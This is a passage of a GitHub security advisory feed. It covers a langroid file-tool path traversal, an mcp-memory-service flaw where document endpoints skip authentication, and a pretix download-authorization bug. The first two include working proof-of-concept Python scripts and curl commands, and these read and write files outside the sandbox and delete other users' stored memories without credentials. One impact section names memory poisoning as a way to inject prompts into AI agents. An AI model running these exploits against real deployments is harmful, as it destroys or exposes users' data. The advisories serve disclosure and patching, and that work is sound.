security tests. A natural 7-case extension covers the 5 PostgreSQL
bypass payloads, the SQLite <code>ATTACH ... AS x</code> form, and the MSSQL
<code>OPENDATASOURCE</code> form.</p>
<h3 id="fix-pr">Fix PR</h3>
<p>A private temp-fork PR applying the <strong>Suggested fix</strong> Approach 1 diff,
plus the regression tests described above, accompanies this advisory:
<a href="https://github.com/langroid/langroid-ghsa-pmch-g965-grmr/pull/1">https://github.com/langroid/langroid-ghsa-pmch-g965-grmr/pull/1</a></p>
<h3 id="credit">Credit</h3>
<p>Reported by tonghuaroot.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langroid/langroid/security/advisories/GHSA-pmch-g965-grmr">https://github.com/langroid/langroid/security/advisories/GHSA-pmch-g965-grmr</a></li>
<li><a href="https://github.com/langroid/langroid/commit/00b7dd7b79c5d03c94be284cf3459d98195ebfba">https://github.com/langroid/langroid/commit/00b7dd7b79c5d03c94be284cf3459d98195ebfba</a></li>
<li><a href="https://github.com/advisories/GHSA-pmch-g965-grmr">https://github.com/advisories/GHSA-pmch-g965-grmr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pmch-g965-grmr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-02T17:42:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langroid] Langroid: Path traversal in the file tools allows read/write outside configured current directory]]></title>
        <id>https://github.com/advisories/GHSA-fg23-3346-88f5</id>
        <link href="https://github.com/advisories/GHSA-fg23-3346-88f5"/>
        <updated>2026-07-02T17:38:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Langroid's <code>ReadFileTool</code> and <code>WriteFileTool</code> appear to treat <code>curr_dir</code> as the intended working-directory boundary for file operations. However, the tools only change the process working directory to <code>curr_dir</code> and then operate on the user-supplied <code>file_path</code> without resolving and enforcing that the final path remains inside <code>curr_dir</code>.</p>
<p>As a result, a tool caller can supply path traversal sequences such as <code>../secret.txt</code> to read files outside the configured current directory, or <code>../written_by_tool.txt</code> to write files outside that directory.</p>
<p>This can impact applications that expose Langroid file tools to an LLM agent, user-controlled tool call, or delegated coding/documentation agent while relying on <code>curr_dir</code> to restrict file access to a project/workspace directory.</p>
<h3 id="details">Details</h3>
<p>Affected components:</p>
<ul>
<li><code>langroid/agent/tools/file_tools.py</code></li>
<li><code>langroid/utils/system.py</code></li>
</ul>
<p>Relevant behavior observed:</p>
<p><code>ReadFileTool</code> contains a comment indicating the intended assumption:</p>
<pre><code class="language-text"># ASSUME: file_path should be relative to the curr_dir

The tool then changes into the configured current directory and calls read_file(self.file_path).

WriteFileTool similarly resolves curr_dir, changes into that directory, and calls create_file(self.file_path, self.content).

The issue is that changing the process working directory does not prevent traversal. A path such as ../secret.txt is still valid and resolves outside the configured curr_dir.

In local testing, ReadFileTool successfully read a file outside the configured sandbox directory, and WriteFileTool successfully wrote a file outside the configured sandbox directory.

PoC

Tested locally against the current Langroid repository checkout.

Environment:

Python 3.12
Langroid installed in editable mode with pip install -e .

PoC script:

from pathlib import Path
from tempfile import TemporaryDirectory
import os

os.environ["docker"] = "false"
os.environ["DOCKER"] = "false"

from langroid.agent.tools.file_tools import ReadFileTool, WriteFileTool


class DummyIndex:
    def add(self, files):
        print("dummy git add:", files)

    def commit(self, message):
        print("dummy git commit:", message)


class DummyRepo:
    index = DummyIndex()


with TemporaryDirectory() as root:
    base = Path(root)
    sandbox = base / "sandbox"
    sandbox.mkdir()

    secret = base / "secret.txt"
    secret.write_text("LANGROID_TOOL_ESCAPE_PROOF", encoding="utf-8")

    ReadSandbox = ReadFileTool.create(get_curr_dir=lambda: sandbox)
    read_tool = ReadSandbox(file_path="../secret.txt")

    print("READ TOOL RESULT:")
    print(read_tool.handle())

    WriteSandbox = WriteFileTool.create(
        get_curr_dir=lambda: sandbox,
        get_git_repo=lambda: DummyRepo(),
    )

    write_tool = WriteSandbox(
        file_path="../written_by_tool.txt",
        content="WRITTEN_BY_LANGROID_TOOL",
        language="text",
    )

    print("WRITE TOOL RESULT:")
    print(write_tool.handle())

    outside = base / "written_by_tool.txt"
    print("outside exists:", outside.exists())
    print("outside content:", outside.read_text(encoding="utf-8"))

Observed output:

READ TOOL RESULT:

    CONTENTS of ../secret.txt:
    (Line numbers added for reference only!)
    ---------------------------
    1: LANGROID_TOOL_ESCAPE_PROOF

WRITE TOOL RESULT:
Content created/updated in: ..\written_by_tool.txt
dummy git add: ['../written_by_tool.txt']
dummy git commit: Agent write file tool
Content written to ../written_by_tool.txt and committed
outside exists: True
outside content: WRITTEN_BY_LANGROID_TOOL

This demonstrates that both read and write operations can escape the configured curr_dir using ../ traversal.

Impact

If an application enables Langroid's file tools and treats curr_dir as a project, workspace, repository, or sandbox boundary, a tool caller can escape that boundary.

Potential impact includes:

Reading files outside the intended workspace.
Writing files outside the intended workspace.
Exposing local secrets, configuration files, source files, environment files, or other project-adjacent files.
Modifying files outside the intended project directory if WriteFileTool is enabled.

This is especially relevant in agentic workflows where an LLM or external user can influence tool arguments.

This report does not claim unauthenticated remote exploitation by default. The impact depends on how an application exposes Langroid file tools and whether curr_dir is intended to restrict file access.

Suggested remediation

Before reading, writing, or listing files, resolve the configured base directory and the requested target path, then reject any path that escapes the base directory.

Example patch pattern:

from pathlib import Path

def safe_join(base_dir: str | Path, user_path: str | Path) -&gt; Path:
    base = Path(base_dir).resolve()
    target = (base / user_path).resolve()

    if target != base and base not in target.parents:
        raise ValueError("Path escapes configured current directory")

    return target

Then use the resolved safe path for ReadFileTool, WriteFileTool, and ListDirTool.

Suggested regression tests:

ReadFileTool(file_path="../secret.txt") should be rejected.
WriteFileTool(file_path="../outside.txt") should be rejected.
Absolute paths outside curr_dir should be rejected.
Symlink-based escapes should be rejected after final path resolution.
Normal relative paths inside curr_dir, such as src/main.py, should continue to work.

[Langroid CVE Report.pdf](https://github.com/user-attachments/files/28333958/Langroid.CVE.Report.pdf)
### References

- &lt;https://github.com/langroid/langroid/security/advisories/GHSA-fg23-3346-88f5&gt;
- &lt;https://github.com/langroid/langroid/commit/56e2756ecab70a70a7e6edbee2f2187b8484683e&gt;
- &lt;https://github.com/advisories/GHSA-fg23-3346-88f5&gt;
</code></pre>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fg23-3346-88f5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-02T17:38:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mcp-memory-service] mcp-memory-service: Missing Authentication on Document API Endpoints Allows Unauthenticated Memory Read/Write/Delete]]></title>
        <id>https://github.com/advisories/GHSA-84hp-mqvj-3p8h</id>
        <link href="https://github.com/advisories/GHSA-84hp-mqvj-3p8h"/>
        <updated>2026-07-02T15:26:24.000Z</updated>
        <content type="html"><![CDATA[<h2 id="missing-authentication-on-document-api-endpoints-allows-unauthenticated-memory-readwritedelete">Missing Authentication on Document API Endpoints Allows Unauthenticated Memory Read/Write/Delete</h2>
<h3 id="summary">Summary</h3>
<p>All HTTP routes under <code>/api/documents/*</code> in <code>mcp-memory-service</code> are served without any authentication dependency, even when the server is configured with an API key (<code>MCP_API_KEY</code>) or OAuth. An unauthenticated remote attacker can upload arbitrary content into the memory store (write), retrieve stored document content (read), and permanently delete memories belonging to authenticated users (delete) — all without supplying any credentials. The <code>/api/memories</code> counterpart correctly enforces authentication, making this an inconsistent and exploitable authentication boundary. CVSS 9.8 Critical.</p>
<h3 id="details">Details</h3>
<p>The <code>documents.py</code> router is instantiated without any router-level <code>dependencies=</code> parameter and the file does not import <code>Depends</code> at all, so no authentication guard is present on any of its routes:</p>
<ul>
<li><strong><code>src/mcp_memory_service/web/api/documents.py:33</code></strong> — <code>from fastapi import APIRouter, UploadFile, File, Form, HTTPException, BackgroundTasks</code> (<code>Depends</code> is absent)</li>
<li><strong><code>src/mcp_memory_service/web/api/documents.py:43</code></strong> — <code>router = APIRouter()</code> (no <code>dependencies=</code> argument)</li>
</ul>
<p>The affected endpoints and their data-flow sinks are:</p>
<table>
<thead>
<tr>
<th>Route</th>
<th>Line (source)</th>
<th>Sink</th>
<th>Line (sink)</th>
</tr>
</thead>
<tbody><tr>
<td><code>POST /upload</code></td>
<td>149</td>
<td><code>storage.store(memory)</code></td>
<td>449</td>
</tr>
<tr>
<td><code>POST /batch-upload</code></td>
<td>—</td>
<td><code>storage.store(memory)</code></td>
<td>—</td>
</tr>
<tr>
<td><code>GET /history</code></td>
<td>—</td>
<td>upload metadata response</td>
<td>—</td>
</tr>
<tr>
<td><code>GET /search-content/{upload_id}</code></td>
<td>729</td>
<td>memory content response</td>
<td>781</td>
</tr>
<tr>
<td><code>DELETE /remove/{upload_id}</code></td>
<td>—</td>
<td>storage deletion</td>
<td>—</td>
</tr>
<tr>
<td><code>DELETE /remove-by-tags</code></td>
<td>687</td>
<td><code>storage.delete_by_tags(tags)</code></td>
<td>705</td>
</tr>
</tbody></table>
<p>The router is mounted in <code>src/mcp_memory_service/web/app.py:311</code>:</p>
<pre><code class="language-python">app.include_router(documents_router, prefix="/api/documents")
</code></pre>
<p>No <code>CORSMiddleware</code> or authentication middleware applies to these routes at mount time.</p>
<p>By contrast, the equivalent write endpoint in <code>memories.py</code> is correctly protected:</p>
<pre><code class="language-python"># src/mcp_memory_service/web/api/memories.py:136
user: AuthenticationResult = Depends(require_write_access)
</code></pre>
<p>This demonstrates that the authentication infrastructure exists and is intentionally applied elsewhere, but was omitted from all <code>documents.py</code> routes.</p>
<h3 id="poc">PoC</h3>
<p><strong>Prerequisites</strong></p>
<ul>
<li>Docker installed</li>
<li>Repository cloned at <code>repo</code></li>
</ul>
<p><strong>Build and run the container</strong></p>
<pre><code class="language-bash">docker build -t vuln-001-mcp-memory-poc \
  -f vuln-001/Dockerfile \
  repo

docker run -d --name vuln-001-poc-container \
  -p 18000:8000 vuln-001-mcp-memory-poc:latest
</code></pre>
<p>The container starts <code>mcp-memory-service</code> with <code>MCP_API_KEY=poc-secret-key-12345</code>, simulating a production deployment where the operator has enabled API-key authentication.</p>
<p><strong>Execute the PoC</strong></p>
<pre><code class="language-bash">python3 vuln-001/poc.py \
  --host 127.0.0.1 --port 18000 --api-key poc-secret-key-12345
</code></pre>
<p><strong>Attack chain (6 steps)</strong></p>
<pre><code>[STEP 1] GET /api/memories (no auth) → HTTP 401   ← auth guard is active on memories API
[STEP 2] POST /api/memories (with API key) → HTTP 200   ← legitimate user stores sensitive data
[STEP 3] GET /api/memories (with API key) → HTTP 200  memories_found=1   ← data confirmed
[STEP 4] POST /api/documents/upload (NO auth) → HTTP 200  upload_id=&lt;uuid&gt;   ← WRITE bypass
[STEP 5] DELETE /api/documents/remove-by-tags (NO auth) → HTTP 200  memories_deleted=1   ← DELETE bypass
[STEP 6] GET /api/memories (with API key) → HTTP 200  memories_remaining=0   ← integrity impact confirmed
</code></pre>
<p>Step 6 proves that an unauthenticated attacker deleted data created by a legitimately authenticated user in a single unauthenticated request.</p>
<p><strong>Manual curl equivalent</strong></p>
<pre><code class="language-bash"># Confirm auth guard is active on /api/memories
curl -i http://127.0.0.1:18000/api/memories
# → 401 Unauthorized

# Write through document API — no credentials
printf 'CVE_AUTH_BYPASS_MARKER' &gt; /tmp/poc.txt
UPLOAD_ID=$(
  curl -s -X POST http://127.0.0.1:18000/api/documents/upload \
    -F "file=@/tmp/poc.txt" -F "tags=cve-poc" |
  python3 -c 'import sys,json; print(json.load(sys.stdin)["upload_id"])'
)
# → 200 OK

sleep 3
curl -s "http://127.0.0.1:18000/api/documents/search-content/$UPLOAD_ID"
# → content returned without authentication

# Delete by tag — no credentials
curl -i -X DELETE "http://127.0.0.1:18000/api/documents/remove-by-tags" \
  -H "Content-Type: application/json" -d '["cve-poc"]'
# → 200 OK, memories_deleted=1
</code></pre>
<p><strong>Observed output</strong></p>
<ul>
<li><code>GET /api/memories</code> (no auth) returns <code>401</code> — the authentication guard is demonstrably active on the memories API.</li>
<li><code>POST /api/documents/upload</code> (no auth) returns <code>200</code> with a valid <code>upload_id</code>.</li>
<li><code>DELETE /api/documents/remove-by-tags</code> (no auth) returns <code>200</code> with <code>memories_deleted=1</code>.</li>
<li>A subsequent authenticated <code>GET /api/memories</code> returns <code>memories_remaining=0</code>, confirming that legitimately stored data was destroyed by an unauthenticated request.</li>
</ul>
<p><strong>Remediation</strong></p>
<p>Add <code>Depends(require_write_access)</code> / <code>Depends(require_read_access)</code> to every affected route in <code>documents.py</code>:</p>
<pre><code class="language-diff">--- a/src/mcp_memory_service/web/api/documents.py
+++ b/src/mcp_memory_service/web/api/documents.py
-from fastapi import APIRouter, UploadFile, File, Form, HTTPException, BackgroundTasks
+from fastapi import APIRouter, UploadFile, File, Form, HTTPException, BackgroundTasks, Depends
 from ..dependencies import get_storage
+from ..oauth.middleware import require_read_access, require_write_access, AuthenticationResult

 async def upload_document(
     background_tasks: BackgroundTasks,
     file: UploadFile = File(...),
+    user: AuthenticationResult = Depends(require_write_access),

 async def batch_upload_documents(
     background_tasks: BackgroundTasks,
     files: List[UploadFile] = File(...),
+    user: AuthenticationResult = Depends(require_write_access),

-async def get_upload_status(upload_id: str):
+async def get_upload_status(upload_id: str, user: AuthenticationResult = Depends(require_read_access)):

-async def get_upload_history():
+async def get_upload_history(user: AuthenticationResult = Depends(require_read_access)):

-async def remove_document(upload_id: str, remove_from_memory: bool = True):
+async def remove_document(upload_id: str, remove_from_memory: bool = True,
+    user: AuthenticationResult = Depends(require_write_access)):

-async def remove_documents_by_tags(tags: List[str]):
+async def remove_documents_by_tags(tags: List[str],
+    user: AuthenticationResult = Depends(require_write_access)):

-async def search_document_content(upload_id: str, limit: int = 1000):
+async def search_document_content(upload_id: str, limit: int = 1000,
+    user: AuthenticationResult = Depends(require_read_access)):
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is a <strong>Missing Authentication for Critical Function (CWE-306)</strong> vulnerability affecting the HTTP REST server component of <code>mcp-memory-service</code>.</p>
<p><strong>Who is impacted:</strong> Any operator who deploys the HTTP REST server (<code>memory server --http</code>) with <code>MCP_API_KEY</code> or OAuth enabled, expecting that only authenticated clients can access stored memories. The HTTP server is documented as a supported production feature for team/multi-client deployments.</p>
<p><strong>Confidentiality:</strong> An unauthenticated attacker can read recently uploaded document content via <code>GET /api/documents/search-content/{upload_id}</code> and enumerate upload history via <code>GET /api/documents/history</code>. Stored memories may contain sensitive context such as personal notes, AI agent working state, or proprietary data.</p>
<p><strong>Integrity:</strong> An unauthenticated attacker can inject arbitrary content into the memory store by uploading documents, polluting the AI agent's knowledge base with attacker-controlled data (memory poisoning / prompt injection surface).</p>
<p><strong>Availability:</strong> An unauthenticated attacker can delete all memories matching any chosen tags via <code>DELETE /api/documents/remove-by-tags</code>, or delete individual documents via <code>DELETE /api/documents/remove/{upload_id}</code>, causing permanent loss of stored data.</p>
<h3 id="reproduction-artifacts">Reproduction artifacts</h3>
<h4 id="dockerfile"><code>Dockerfile</code></h4>
<pre><code class="language-dockerfile">FROM python:3.12-slim

ENV PYTHONDONTWRITEBYTECODE=1
ENV PYTHONUNBUFFERED=1
ENV HF_HOME=/root/.cache/huggingface

WORKDIR /app

RUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends \
 build-essential \
 &amp;&amp; rm -rf /var/lib/apt/lists/*

# Install CPU-only torch first to avoid pulling the large CUDA wheel from PyPI
RUN pip install --no-cache-dir \
 "torch&gt;=2.0.0" \
 --index-url https://download.pytorch.org/whl/cpu

# Copy and install the mcp-memory-service from the local repo
COPY . /app
RUN pip install --no-cache-dir -e .

# Pre-download the sentence-transformers embedding model so the container
# can run fully offline and starts quickly
RUN python -c "from sentence_transformers import SentenceTransformer; m = SentenceTransformer('all-MiniLM-L6-v2'); v = m.encode(['preflight']); print('Embedding model ready, dim=' + str(len(v[0])))"

# ── Runtime config ──────────────────────────────────────────────────────────
# MCP_API_KEY is set to simulate a production deployment where the operator
# has enabled API-key authentication. The bug is that /api/documents/* routes
# ignore this key entirely.
ENV MCP_API_KEY=poc-secret-key-12345
ENV MCP_MEMORY_STORAGE_BACKEND=sqlite_vec
ENV MCP_HTTP_PORT=8000
ENV MCP_HTTP_HOST=0.0.0.0
ENV MCP_MDNS_ENABLED=false
ENV MCP_CONSOLIDATION_ENABLED=false
ENV MCP_BACKUP_ENABLED=false
ENV MCP_QUALITY_SYSTEM_ENABLED=false
# Prevent any outbound HuggingFace requests at runtime
ENV TRANSFORMERS_OFFLINE=1
ENV HF_DATASETS_OFFLINE=1

EXPOSE 8000

CMD ["python", "run_server.py"]
</code></pre>
<h4 id="pocpy"><code>poc.py</code></h4>
<pre><code class="language-python">#!/usr/bin/env python3
"""
PoC – VULN-001: Missing Authentication on Document API Endpoints
CWE-306 Missing Authentication for Critical Function
CVSS 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

Attack chain:
 1. GET /api/memories (no auth) → 401 (auth guard confirmed active)
 2. POST /api/memories (with API key) → 200 (legitimate write)
 3. GET /api/memories (with API key) → 200 (data exists)
 4. POST /api/documents/upload (NO auth!) → 200 (write bypass)
 5. DELETE /api/documents/remove-by-tags (NO auth!) → 200 (delete bypass)
 6. GET /api/memories (with API key) → memory is GONE

Step 6 proves an unauthenticated attacker destroyed data created by a
legitimate, authenticated user — confirming full integrity impact.

Usage:
 python3 poc.py [--host 127.0.0.1] [--port 8000] [--api-key poc-secret-key-12345]
"""

import sys
import time
import json
import uuid
import argparse
import http.client

MARKER = "VULN001_AUTH_BYPASS_" + uuid.uuid4().hex[:12].upper()
TARGET_TAG = f"vuln001-target-{uuid.uuid4().hex[:6]}"


# ─── low-level helpers ───────────────────────────────────────────────────────

def http_req(host, port, method, path, body=None, headers=None, timeout=20):
 conn = http.client.HTTPConnection(host, port, timeout=timeout)
 h = dict(headers or {})
 conn.request(method, path, body=body, headers=h)
 resp = conn.getresponse()
 return resp.status, resp.read().decode("utf-8", errors="replace")


def wait_ready(host, port, timeout=120):
 print(f"[*] Waiting for server at {host}:{port} …", flush=True)
 deadline = time.time() + timeout
 while time.time() &lt; deadline:
 try:
 s, _ = http_req(host, port, "GET", "/api/health", timeout=2)
 if s == 200:
 print("[+] Server ready\n", flush=True)
 return True
 except Exception:
 pass
 time.sleep(1)
 return False


def build_multipart(boundary, filename, file_bytes, tags_str):
 b = boundary.encode()
 return b"".join([
 b"--" + b + b"\r\n",
 b'Content-Disposition: form-data; name="file"; filename="' + filename.encode() + b'"\r\n',
 b"Content-Type: /plain\r\n\r\n",
 file_bytes,
 b"\r\n--" + b + b"\r\n",
 b'Content-Disposition: form-data; name="tags"\r\n\r\n',
 tags_str.encode(),
 b"\r\n--" + b + b"--\r\n",
 ])


# ─── individual test steps ───────────────────────────────────────────────────

def step_memories_no_auth(host, port):
 """GET /api/memories without auth must return 401."""
 print("[STEP 1] GET /api/memories (no auth — expect 401)", flush=True)
 status, body = http_req(host, port, "GET", "/api/memories")
 ok = (status == 401)
 print(f" {'PASS' if ok else 'FAIL'} HTTP {status}", flush=True)
 return ok, status


def step_store_memory_with_auth(host, port, api_key):
 """POST /api/memories with API key — store a 'legitimate' memory."""
 print(f"[STEP 2] POST /api/memories (with API key, tag={TARGET_TAG})", flush=True)
 payload = json.dumps({
 "content": f"Sensitive memory — {MARKER}",
 "tags": [TARGET_TAG, "vuln001-demo"],
 "memory_type": "observation",
 "metadata": {"poc": "VULN-001"}
 }).encode()
 headers = {
 "Content-Type": "application/json",
 "Content-Length": str(len(payload)),
 "X-API-Key": api_key,
 }
 status, body = http_req(host, port, "POST", "/api/memories", payload, headers)
 ok = status in (200, 201)
 content_hash = None
 try:
 content_hash = json.loads(body).get("content_hash")
 except Exception:
 pass
 print(f" {'PASS' if ok else 'FAIL'} HTTP {status} hash={content_hash}", flush=True)
 if not ok:
 print(f" body: {body[:300]}", flush=True)
 return ok, status, content_hash


def step_verify_memory_exists(host, port, api_key):
 """GET /api/memories with auth — confirm the memory is stored."""
 print("[STEP 3] GET /api/memories (with API key — confirm data exists)", flush=True)
 headers = {"X-API-Key": api_key}
 status, body = http_req(host, port, "GET", f"/api/memories?tags={TARGET_TAG}", headers=headers)
 ok = status == 200
 count = 0
 try:
 data = json.loads(body)
 count = data.get("total", len(data.get("memories", [])))
 except Exception:
 pass
 print(f" {'PASS' if ok else 'FAIL'} HTTP {status} memories_found={count}", flush=True)
 return ok, status, count


def step_upload_no_auth(host, port):
 """POST /api/documents/upload without any credentials — should return 200."""
 print("[STEP 4] POST /api/documents/upload (NO auth — expect 200)", flush=True)
 boundary = "PocBoundary" + uuid.uuid4().hex
 payload = f"EVIDENCE: {MARKER}\nUploaded without authentication — VULN-001.\n".encode()
 body = build_multipart(boundary, "poc_vuln001.txt", payload, "poc-evidence,vuln001-demo")
 headers = {
 "Content-Type": f"multipart/form-data; boundary={boundary}",
 "Content-Length": str(len(body)),
 }
 status, resp = http_req(host, port, "POST", "/api/documents/upload", body, headers)
 upload_id = None
 try:
 upload_id = json.loads(resp).get("upload_id")
 except Exception:
 pass
 ok = status == 200 and upload_id is not None
 print(f" {'PASS' if ok else 'FAIL'} HTTP {status} upload_id={upload_id}", flush=True)
 if not ok:
 print(f" body: {resp[:300]}", flush=True)
 return ok, status, upload_id


def step_delete_no_auth(host, port):
 """DELETE /api/documents/remove-by-tags without auth — should return 200."""
 print(f"[STEP 5] DELETE /api/documents/remove-by-tags (NO auth, tag={TARGET_TAG})", flush=True)
 # FastAPI 0.100+ treats List[str] in DELETE as request body (JSON array)
 body = json.dumps([TARGET_TAG, "vuln001-demo"]).encode()
 headers = {
 "Content-Type": "application/json",
 "Content-Length": str(len(body)),
 }
 status, resp = http_req(
 host, port, "DELETE", "/api/documents/remove-by-tags",
 body=body, headers=headers
 )
 ok = status == 200
 deleted = 0
 try:
 deleted = json.loads(resp).get("memories_deleted", 0)
 except Exception:
 pass
 print(f" {'PASS' if ok else 'FAIL'} HTTP {status} memories_deleted={deleted}", flush=True)
 if not ok:
 print(f" body: {resp[:300]}", flush=True)
 return ok, status, deleted


def step_verify_memory_gone(host, port, api_key):
 """GET /api/memories with auth — confirm attacker wiped the data."""
 print("[STEP 6] GET /api/memories (with API key — verify data was deleted)", flush=True)
 headers = {"X-API-Key": api_key}
 status, body = http_req(host, port, "GET", f"/api/memories?tags={TARGET_TAG}", headers=headers)
 ok = status == 200
 count = 0
 try:
 data = json.loads(body)
 count = data.get("total", len(data.get("memories", [])))
 except Exception:
 pass
 data_deleted = (ok and count == 0)
 print(f" {'PASS' if data_deleted else 'NOTE'} HTTP {status} memories_remaining={count}", flush=True)
 if data_deleted:
 print(" [+] Memory wiped by unauthenticated attacker — integrity impact confirmed!", flush=True)
 return ok, status, count


# ─── main ────────────────────────────────────────────────────────────────────

def main():
 ap = argparse.ArgumentParser(description="VULN-001 PoC — CWE-306 auth bypass")
 ap.add_argument("--host", default="127.0.0.1")
 ap.add_argument("--port", type=int, default=8000)
 ap.add_argument("--api-key", default="poc-secret-key-12345",
 help="API key configured on the server (simulates legitimate user)")
 args = ap.parse_args()

 print("=" * 65)
 print("VULN-001 Missing Authentication on Document API Endpoints")
 print("CWE-306 / CVSS 9.8 (Critical)")
 print("=" * 65 + "\n")

 if not wait_ready(args.host, args.port):
 print("[-] Server did not become ready", flush=True)
 sys.exit(2)

 r = {}

 # Step 1 — baseline: auth IS enforced on /api/memories
 ok1, s1 = step_memories_no_auth(args.host, args.port)
 r["step1_auth_guard_active"] = {
 "pass": ok1,
 "evidence": f"GET /api/memories (no auth) → HTTP {s1}"
 }

 # Step 2 — legitimate user stores a sensitive memory
 ok2, s2, content_hash = step_store_memory_with_auth(args.host, args.port, args.api_key)
 r["step2_legitimate_write"] = {
 "pass": ok2,
 "evidence": f"POST /api/memories (with API key) → HTTP {s2}"
 }

 # Step 3 — confirm memory exists
 ok3, s3, mem_count = step_verify_memory_exists(args.host, args.port, args.api_key)
 r["step3_data_present"] = {
 "pass": ok3 and mem_count &gt; 0,
 "evidence": f"GET /api/memories (with API key) → HTTP {s3}, count={mem_count}"
 }

 # Step 4 — attacker uploads without auth (WRITE bypass)
 ok4, s4, upload_id = step_upload_no_auth(args.host, args.port)
 r["step4_upload_auth_bypass"] = {
 "pass": ok4,
 "evidence": f"POST /api/documents/upload (NO auth) → HTTP {s4}"
 }

 # Step 5 — attacker deletes WITHOUT auth (DELETE bypass)
 ok5, s5, deleted = step_delete_no_auth(args.host, args.port)
 r["step5_delete_auth_bypass"] = {
 "pass": ok5,
 "evidence": f"DELETE /api/documents/remove-by-tags (NO auth) → HTTP {s5}, deleted={deleted}"
 }

 # Step 6 — verify legitimate data is gone
 ok6, s6, remaining = step_verify_memory_gone(args.host, args.port, args.api_key)
 r["step6_integrity_impact"] = {
 "pass": ok6 and remaining == 0,
 "evidence": f"GET /api/memories (with API key) after attack → count={remaining} (was {mem_count})"
 }

 print("\n" + "=" * 65)
 print("RESULTS SUMMARY")
 print("=" * 65)
 for k, v in r.items():
 sym = "PASS" if v["pass"] else "FAIL"
 print(f" [{sym}] {v['evidence']}", flush=True)

 # Core bypass: /api/memories returns 401 BUT /api/documents/* returns 200 without auth
 bypass_proven = ok1 and ok4
 delete_bypass = ok1 and ok5

 print("\nKey evidence:")
 print(f" Auth guard ACTIVE : GET /api/memories (no auth) → HTTP {s1}")
 print(f" Write BYPASS : POST /api/documents/upload (no auth) → HTTP {s4}")
 print(f" Delete BYPASS : DELETE /api/documents/remove-by-tags (no auth) → HTTP {s5}")

 overall = "PASS – auth bypass confirmed" if (bypass_proven or delete_bypass) else "FAIL"
 print(f"\nVerdict: {overall}")
 print("=" * 65)
 sys.exit(0 if (bypass_proven or delete_bypass) else 1)


if __name__ == "__main__":
 main()
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/doobidoo/mcp-memory-service/security/advisories/GHSA-84hp-mqvj-3p8h">https://github.com/doobidoo/mcp-memory-service/security/advisories/GHSA-84hp-mqvj-3p8h</a></li>
<li><a href="https://github.com/advisories/GHSA-84hp-mqvj-3p8h">https://github.com/advisories/GHSA-84hp-mqvj-3p8h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-84hp-mqvj-3p8h</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-02T15:26:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pretix] pretix vulnerable to Authorization Bypass Through User-Controlled Key]]></title>
        <id>https://github.com/advisories/GHSA-72p9-6vv6-gvqh</id>
        <link href="https://github.com/advisories/GHSA-72p9-6vv6-gvqh"/>
        <updated>2026-07-01T19:47:22.000Z</updated>
        <content type="html"><![CDATA[<p>When creating an export through the pretix API, API clients are returned an UUID value for their export job (a long, random string like 35742818-c375-4d15-839f-d49aecce94d6). Using this UUID, the API client can then request the actual file for download. The same kind of UUID is used in other places in pretix when temporary files are generated for internal use or download.</p>
<p>One remaining API endpoint, however, wrongfully did not verify if the UUID used for download actually belongs to a file that is supposed to be downloadable and belongs to the correct user. In reality, this is hard to exploit because an attacker would need to have access to a valid UUID for the file they desire which is unlikely to happen without a separate security problem giving them access to logs etc.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-9712">https://nvd.nist.gov/vuln/detail/CVE-2026-9712</a></li>
<li><a href="https://pretix.eu/about/en/blog/20260527-release-2026-4-2">https://pretix.eu/about/en/blog/20260527-release-2026-4-2</a></li>
<li><a href="https://github.com/advisories/GHSA-72p9-6vv6-gvqh">https://github.com/advisories/GHSA-72p9-6vv6-gvqh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-72p9-6vv6-gvqh</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-27T15:33:28.000Z</published>
    </entry>
</feed>